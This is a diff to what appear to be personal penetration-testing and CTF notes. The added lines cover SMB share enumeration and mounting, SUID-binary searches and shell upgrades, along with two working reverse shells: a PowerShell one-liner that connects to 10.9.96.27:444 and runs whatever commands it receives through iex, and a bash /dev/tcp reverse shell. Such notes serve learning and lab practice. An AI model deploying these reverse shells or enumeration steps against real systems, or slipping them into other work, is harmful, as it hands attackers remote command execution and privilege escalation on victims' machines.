@@ -166,6 +166,18 @@ search for an auxiliary scanner for smb with meatsploit
 
 SAMBA is a good source for exploits
 
+*Mount SMB share*
+
+https://unix.stackexchange.com/questions/387468/mounting-a-windows-shared-drive-to-kali-linux 
+
+to understand what shares are available
+
+    smbclient -L hostname -I <ip>
+
+to mount the folder
+
+    mount //<ip>/<sharename> /media/<local_name> -o username=user
+
 *Gaining Root with Metasploit*
 
     msfconsole
@@ -1076,8 +1088,19 @@ only works if something shows here with "no_root_squash"
 
 move over something like shell.c and gcc it + chmod +s it
 
+*TTY*
 
- 
+If sudo -l shows tty is missing try to get a shell by using this:
+https://netsec.ws/?p=337 
+
+**Windows Post Exploitation**
+
+*Powershell Reverse Shell*
+
+    $client = New-Object System.Net.Sockets.TCPClient("10.9.96.27",444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
+https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3 
+
 **Windows PW Cracking**
 
 *Crack Password Hash*
@@ -1146,6 +1169,12 @@ Go in virtual network editor
 
 **CTF Notes**
 
+*Reverse Shells*
+
+http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet 
+
+    bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 
+
 *Docker*
 
 https://gtfobins.github.io/gtfobins/docker/ 
@@ -1158,7 +1187,11 @@ bash maybe has to be changed into what is running
 
 Get files that have the SUID Bit set 
 
+First one is more clean
+
     find / -perm -u=s -type f 2>/dev/null
+
+    find / -type f -perm -04000 -ls 2>/dev/null
 
 good entry point is systemctl
 
